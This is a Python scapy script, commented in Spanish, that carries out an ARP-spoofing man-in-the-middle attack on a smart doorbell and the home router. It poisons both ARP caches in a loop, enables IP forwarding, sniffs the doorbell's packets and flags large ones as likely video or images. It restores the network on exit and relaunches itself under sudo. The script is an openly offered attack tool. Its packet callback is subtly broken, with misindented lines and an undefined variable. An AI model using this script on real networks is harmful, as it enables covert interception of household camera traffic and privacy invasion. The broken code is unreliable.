#!/usr/bin/env python3
import time
import sys
import os
from scapy.all import *

# Configuración
TARGET_IP = "192.168.0.5"   # Timbre
GATEWAY_IP = "192.168.0.1"  # Router
INTERFACE = "enp1s0"        # Tu tarjeta de red

# Estado
packet_count = 0
start_time = time.time()
last_size_print = 0

# Configuración Silenciosa
conf.verb = 0 

def get_mac(ip):
    """Obtiene la MAC address de una IP usando ARP request"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
    if ans:
        return ans[0][1].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    """Envía paquete ARP falso (Poisoning) usando Layer 2 para evitar warnings"""
    # Ether dst es la MAC de la víctima (timbre o router)
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False, iface=INTERFACE)

def restore(dest_ip, source_ip, dest_mac, source_mac):
    """Restaura la tabla ARP original"""
    packet = Ether(dst=dest_mac)/ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=4, verbose=False, iface=INTERFACE)

def packet_callback(packet):
    global packet_count
    
    if IP in packet and packet[IP].src == TARGET_IP: # Changed DOORBELL_IP to TARGET_IP
        packet_count += 1 # Added to keep track of packets
        size = len(packet)
        
            print(f"📦 [{packet_count}] Pkt de Timbre ({size} bytes) -> {dst}")
            
            # Detectar VIDEO probable
            if size > 1000:
                print(f"   🚨 POSIBLE VIDEO/IMAGEN ({size} bytes)!")

def main():
    print("💀 INICIANDO ATAQUE MAN-IN-THE-MIDDLE (ARP SPOOFING)...")
    
    # 0. Habilitar IP Forwarding (Para no cortar internet al timbre)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("✅ IP Forwarding habilitado.")

    try:
        print(f"🔍 Buscando MAC del Timbre ({TARGET_IP})...")
        target_mac = None
        while target_mac is None:
            target_mac = get_mac(TARGET_IP)
            if not target_mac:
                print("💤 Timbre dormido. Esperando señal WiFi... (Toca el timbre)", end="\r")
                time.sleep(1)
        
        print(f"\n🎯 ¡OBJETIVO DESPIERTO! MAC: {target_mac}")
        
        print(f"🔍 Buscando MAC del Gateway ({GATEWAY_IP})...")
        gateway_mac = get_mac(GATEWAY_IP)
        if not gateway_mac:
             print("❌ Error crítico: No encuentro al Router.")
             return

        print(f"🚪 Gateway:  {GATEWAY_IP} [{gateway_mac}]")
        print("⚡ INTERCEPTANDO TRÁFICO AHORA... (Ctrl+C para detener)")

        # Iniciar Sniffer en background (hilo simple o loop)
        # Scapy sniff es bloqueante, así que haremos sniffing y spoofing intercalados 
        # o usamos un hilo para spoofing. Para simpleza, spoofing en loop y sniff pasivo en otra terminal seria mejor,
        # pero aquí haremos un loop simple de Spoofing y contaremos paquetes "a ojo" via kernel counters o scapy async.
        
        # Mejor estrategia simple: Bucle infinito de Spoofing. 
        # El usuario verá si el timbre funciona (si no se corta, el forward anda).
        # Y usaremos `sniff` con `timeout` breve para mirar tráfico.
        
        while True:
            # 1. Envenenar cache ARP
            spoof(TARGET_IP, GATEWAY_IP, target_mac)
            spoof(GATEWAY_IP, TARGET_IP, gateway_mac)
            
            # 2. Escuchar brevemente (0.5s)
            sniff(filter=f"host {TARGET_IP}", prn=packet_callback, timeout=0.5, store=0, iface=INTERFACE)
            
    except KeyboardInterrupt:
        print("\n🏳️ Deteniendo ataque y restaurando red...")
        restore(TARGET_IP, GATEWAY_IP, target_mac, gateway_mac)
        restore(GATEWAY_IP, TARGET_IP, gateway_mac, target_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("✅ Red restaurada.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("⚠️  NECESITO SUDO! Ejecuta con 'sudo python3 ...'")
        # Re-ejecutar con sudo
        os.execvp("sudo", ["sudo", "python3"] + sys.argv)
    else:
        main()
